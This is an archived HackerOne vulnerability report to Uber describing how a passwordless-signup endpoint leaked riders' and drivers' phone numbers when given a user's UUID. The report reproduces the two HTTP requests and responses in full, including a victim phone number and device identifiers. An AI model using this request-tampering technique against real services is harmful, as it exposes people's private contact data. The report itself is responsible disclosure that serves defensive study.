# phone number exposure for riders/drivers given email/uuid

## Report Details
- **Report ID**: 225243
- **URL**: https://hackerone.com/reports/225243
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-05-01T05:59:52.523Z
- **Disclosed**: 2017-06-02T17:56:43.085Z

## Reporter
- **Username**: vijay_kumar
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: uber

## Vulnerability Information
Hi ,
## Summary
I have found one more vulnerable endpoint that is leaking user's phone number when i submit UUID in the request. This attack works for both Driver and Rider.

## Security Impact
We can get any Rider or Driver private phone number by knowing his UUID.

## Reproduction Steps
1 . Enter victim's UUID in loginId and replay the following request.

__Request:__
```
POST /rt/users/passwordless-signup HTTP/1.1
Content-Type: application/json; charset=UTF-8
Host: cn-dca1.uber.com
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/12.7.2
Content-Length: 663

{
    "commonData": {
        "appName": "client",
        "deviceIMEI": "541127718435990",
        "deviceId": "6f4b8fed46dce6b5cc77f67d19adc2f2",
        "deviceMobileCountryCode": "in",
        "deviceMobileDigits": "",
        "deviceModel": "HM NOTE 1LTE",
        "deviceOS": "4.4.4",
        "deviceSerialNumber": "2f1e6fa",
        "version": "3.134.5",
        "language": "en_US",
        "latitude": 0.0,
        "longitude": 0.0,
        "epoch": 1484671747392
    },
    "mobileCountryISO2": "IN",
    "loginId": "ee497b97-bc85-4687-b20b-ecf352a590c2",
    "state": "NOT_STARTED",
    "userRole": "client",
    "userWorkflow": "PASSWORDLESS_SIGNUP"
}
```

__Response:__

```
{
	"loginId": "",
	"serverState": "SIGN_IN",
	"tripVerifyStateData": {},
	"userMessage": null,
	"userRole": "client",
	"userWorkflow": "PASSWORDLESS_SIGNUP"
}
```

2 . Now change state to __SIGN_IN__ in the request and replay .

__Request:__

```
POST /rt/users/passwordless-signup HTTP/1.1
Content-Type: application/json; charset=UTF-8
Host: cn-dca1.uber.com
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/12.7.2
Content-Length: 659

{
    "commonData": {
        "appName": "client",
        "deviceIMEI": "541127718435990",
        "deviceId": "6f4b8fed46dce6b5cc77f67d19adc2f2",
        "deviceMobileCountryCode": "in",
        "deviceMobileDigits": "",
        "deviceModel": "HM NOTE 1LTE",
        "deviceOS": "4.4.4",
        "deviceSerialNumber": "2f1e6fa",
        "version": "3.134.5",
        "language": "en_US",
        "latitude": 0.0,
        "longitude": 0.0,
        "epoch": 1484671747392
    },
    "mobileCountryISO2": "IN",
    "loginId": "ee497b97-bc85-4687-b20b-ecf352a590c2",
    "state": "SIGN_IN",
    "userRole": "client",
    "userWorkflow": "PASSWORDLESS_SIGNUP"
}
```

__Response:__

```
{
	"errorCode": "INVALID_REQUEST",
	"errorMessage": "Client should never call backend with this state.",
	"phoneNumberE164": "+919899665409",
	"serverState": "FAILED",
	"userMessage": "The client request has invalid parameters. Please update your app and retry.",
	"userWorkflow": "PASSWORDLESS_SIGNUP"
}
```

You will see Victim's private phone number in the response.

Thank you


## Attachments
No attachments
